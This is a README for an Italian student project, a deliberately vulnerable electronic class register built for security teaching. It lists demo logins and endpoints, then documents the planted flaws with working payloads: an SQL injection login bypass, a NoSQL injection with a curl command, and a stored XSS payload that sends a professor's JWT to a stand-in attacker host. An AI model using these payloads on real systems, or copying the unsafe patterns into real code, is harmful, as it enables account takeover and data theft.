# ClasseMorta

Progetto TPSIT 5INB - Registro elettronico didattico, ispirato a ClasseViva.
**Attenzione:** il progetto include alcune vulnerabilità *volontarie* (SQL/NoSQL
injection e Stored XSS) per scopi puramente didattici. **NON usare in produzione.**

---

## Stack

| Componente | Tecnologia |
|------------|------------|
| Backend    | PHP 8.2 + Apache (REST API in JSON) |
| Frontend   | HTML / CSS personalizzato / JavaScript vanilla |
| RDBMS      | PostgreSQL (Neon) - utenti, classi, verifiche |
| NoSQL      | MongoDB Atlas - voti |
| Sessioni   | JWT (HS256) firmato con `JWT_SECRET` |
| Async      | `fetch` + `XMLHttpRequest` (entrambi presenti) |
| Container  | Docker Compose (Apache + Nginx) |

---

## Avvio locale

```bash
docker-compose up --build
```

| Servizio | URL                     |
|----------|-------------------------|
| Frontend | http://localhost:3000   |
| Backend  | http://localhost:8080   |


---

## Credenziali demo

**Professori** (login con ruolo *Professore*)

| Email | Password |
|-------|----------|
| mario.rossi@scuola.it | prof123 |
| elena.bianchi@scuola.it | prof123 |

**Studenti** (login con ruolo *Studente*)

| Email | Password | Classe |
|-------|----------|--------|
| luca.verdi@studenti.it | studente1 | 5A |
| sofia.neri@studenti.it | studente2 | 5A |
| marco.gialli@studenti.it | studente3 | 4B |
| anna.blu@studenti.it | studente4 | 4B |

---

## Struttura

```
ClasseMorta/
├── backend/
│   ├── index.php                  # Router REST
│   ├── Dockerfile                 # PHP 8.2 + pdo_pgsql + mongodb
│   ├── .htaccess                  # Apache rewrite -> index.php
│   └── src/
│       ├── Controllers/
│       │   ├── AuthController.php       (SQL injection)
│       │   ├── StudentiController.php
│       │   ├── VotiController.php       (NoSQL injection)
│       │   └── VerificheController.php  (Stored XSS)
│       ├── Models/
│       │   ├── Utenti.php
│       │   ├── Voti.php
│       │   └── Verifiche.php
│       └── helpers/
│           ├── db.php       (PDO Postgres + .env loader)
│           ├── mongo.php    (driver MongoDB low-level)
│           └── jwt.php      (encode/decode + middleware)
├── frontend/
│   ├── assets/
│   │   ├── logo.png
│   │   └── style.css
│   ├── app.js                     # Auth, fetch, XHR, navbar
│   ├── index.html                 # Redirect intelligente
│   ├── login.html                 # Login (POST /api/login)
│   ├── dashboard.html             # Pannello prof / studente
│   ├── studenti.html              # (XHR) elenco studenti per classe
│   ├── voti.html                  # Gestione voti (prof)
│   ├── voti-studente.html         # I miei voti (studente)
│   ├── verifiche.html             # Lista verifiche
│   ├── crea-verifica.html         # Creazione verifica (prof)
│   ├── verifica.html              # Svolgimento (studente)
│   └── risposte.html              # Review risposte (prof) - XSS sink
├── schema.sql
├── docker-compose.yml
└── .env                           # PG, MONGO_URI, JWT_SECRET
```

---

## API REST

Tutte le risposte sono in JSON. Le rotte protette richiedono header
`Authorization: Bearer <token>`.

### Provala con il tuo client API

Importa la collezione [`backend/scripts/classemorta.postman_collection.json`](backend/scripts/classemorta.postman_collection.json)
nel client che preferisci. Include: tutti gli endpoint, credenziali demo, payload di
SQLi / NoSQLi / XSS, e uno script post-request che salva automaticamente il
JWT dopo il login.

[![Postman](https://img.shields.io/badge/▶_Importa_in-Postman-FF6C37?style=for-the-badge&logo=postman&logoColor=white)](backend/scripts/classemorta.postman_collection.json)
[![Apidog](https://img.shields.io/badge/▶_Importa_in-Apidog-FB8B23?style=for-the-badge)](backend/scripts/classemorta.postman_collection.json)
[![Insomnia](https://img.shields.io/badge/▶_Importa_in-Insomnia-5849BE?style=for-the-badge&logo=insomnia&logoColor=white)](backend/scripts/classemorta.postman_collection.json)
[![Hoppscotch](https://img.shields.io/badge/▶_Apri_in-Hoppscotch-1ABC9C?style=for-the-badge)](https://hoppscotch.io/)

> La variabile di collezione `baseUrl` punta di default a `https://classemorta-production.up.railway.app`.
> Cambiala se hai un dominio diverso.

### Elenco endpoint

Cliccando "▶ Try" apri Hoppscotch (web client, no signup) con metodo e URL
già pre-compilati: ti basta incollare il JWT nel tab *Authorization → Bearer*
e premere Send.

| Metodo | Endpoint | Ruolo | Descrizione | |
|--------|----------|-------|-------------|---|
| POST   | `/api/login` | pubblico | Login (`{email, password, ruolo}`). Restituisce JWT. | [▶ Try](https://hoppscotch.io/?method=POST&url=https%3A%2F%2Fclassemorta-production.up.railway.app%2Fapi%2Flogin) |
| GET    | `/api/me`    | auth | Dati dell'utente loggato dal token | [▶ Try](https://hoppscotch.io/?method=GET&url=https%3A%2F%2Fclassemorta-production.up.railway.app%2Fapi%2Fme) |
| GET    | `/api/classi` | prof | Classi e materie insegnate dal prof loggato | [▶ Try](https://hoppscotch.io/?method=GET&url=https%3A%2F%2Fclassemorta-production.up.railway.app%2Fapi%2Fclassi) |
| GET    | `/api/studenti?classe=5A` | prof | Studenti della classe | [▶ Try](https://hoppscotch.io/?method=GET&url=https%3A%2F%2Fclassemorta-production.up.railway.app%2Fapi%2Fstudenti%3Fclasse%3D5A) |
| GET    | `/api/studenti/:id` | prof | Singolo studente | [▶ Try](https://hoppscotch.io/?method=GET&url=https%3A%2F%2Fclassemorta-production.up.railway.app%2Fapi%2Fstudenti%2F1) |
| GET    | `/api/voti?studente_id=:id` | prof / studente | Voti dello studente (Mongo) | [▶ Try](https://hoppscotch.io/?method=GET&url=https%3A%2F%2Fclassemorta-production.up.railway.app%2Fapi%2Fvoti%3Fstudente_id%3D1) |
| GET    | `/api/voti/me` | studente | Voti propri | [▶ Try](https://hoppscotch.io/?method=GET&url=https%3A%2F%2Fclassemorta-production.up.railway.app%2Fapi%2Fvoti%2Fme) |
| POST   | `/api/voti`    | prof | Inserisce voto | [▶ Try](https://hoppscotch.io/?method=POST&url=https%3A%2F%2Fclassemorta-production.up.railway.app%2Fapi%2Fvoti) |
| DELETE | `/api/voti/:id` | prof | Elimina voto | [▶ Try](https://hoppscotch.io/?method=DELETE&url=https%3A%2F%2Fclassemorta-production.up.railway.app%2Fapi%2Fvoti%2FOBJECTID) |
| GET    | `/api/verifiche` | auth | Verifiche (lista contestuale al ruolo) | [▶ Try](https://hoppscotch.io/?method=GET&url=https%3A%2F%2Fclassemorta-production.up.railway.app%2Fapi%2Fverifiche) |
| POST   | `/api/verifiche` | prof | Crea verifica con domande | [▶ Try](https://hoppscotch.io/?method=POST&url=https%3A%2F%2Fclassemorta-production.up.railway.app%2Fapi%2Fverifiche) |
| GET    | `/api/verifiche/:id` | auth | Dettaglio verifica + domande | [▶ Try](https://hoppscotch.io/?method=GET&url=https%3A%2F%2Fclassemorta-production.up.railway.app%2Fapi%2Fverifiche%2F1) |
| POST   | `/api/verifiche/:id/risposte` | studente | Consegna risposte | [▶ Try](https://hoppscotch.io/?method=POST&url=https%3A%2F%2Fclassemorta-production.up.railway.app%2Fapi%2Fverifiche%2F1%2Frisposte) |
| GET    | `/api/verifiche/:id/risposte` | prof | Tutte le risposte | [▶ Try](https://hoppscotch.io/?method=GET&url=https%3A%2F%2Fclassemorta-production.up.railway.app%2Fapi%2Fverifiche%2F1%2Frisposte) |

---

## Vulnerabilità didattiche (volontarie)

### 1. SQL Injection - login

`backend/src/Models/Utenti.php :: loginVulnerabile()` concatena email e
password direttamente nella query:

```sql
SELECT * FROM <tabella> WHERE email = '$email' AND password = '$password' LIMIT 1
```

**Payload demo** (login come professore):

| Campo    | Valore |
|----------|--------|
| Ruolo    | Professore |
| Email    | `' OR '1'='1' --` |
| Password | qualsiasi |

Il primo professore in tabella viene autenticato.

### 2. NoSQL Injection - voti

`backend/src/Controllers/VotiController.php :: lista()` passa direttamente
il valore di `$_GET['studente_id']` al filtro Mongo. Un client può
trasformare il parametro in un oggetto annidato:

```
GET /api/voti?studente_id[$ne]=null
```

PHP costruisce `['studente_id' => ['$ne' => null]]` ed il driver Mongo
lo interpreta come operatore: vengono restituiti **tutti i voti** di
tutti gli studenti, anche da uno studente "normale" se è loggato.

Test rapido:

```bash
curl -H "Authorization: Bearer <jwt-studente>" \
     "http://localhost:8080/api/voti?studente_id\[%24ne\]=null"
```

### 3. Stored XSS - risposte verifica

In `frontend/risposte.html` le risposte degli studenti vengono inserite
con `innerHTML` senza escaping. Uno studente può consegnare:

```html
<img src=x onerror="fetch('https://attaccante.example/?t='+localStorage.getItem('classemorta_jwt'))">
```

Quando il professore apre la pagina di review, il payload viene
eseguito nel suo browser e il JWT (memorizzato in `localStorage`) viene
inviato al server dell'attaccante. Da quel momento l'attaccante può
impersonare il professore via REST.

---

## Tecnologie esplicitamente richieste dalla traccia

- **API REST**: tutto il backend (`/api/*`) è una REST API JSON.
- **Asynchronous request (XHR)**: la pagina `studenti.html` usa
  `XMLHttpRequest` (vedi `apiXHR()` in `app.js`). Le altre pagine
  usano `fetch`, anch'esso asincrono.

---

## Reset MongoDB

Per ripulire la collection `voti` durante lo sviluppo:

```js
// dalla shell mongosh
use classemorta
db.voti.drop()
```

I voti vengono ricreati al primo `POST /api/voti` da un professore.
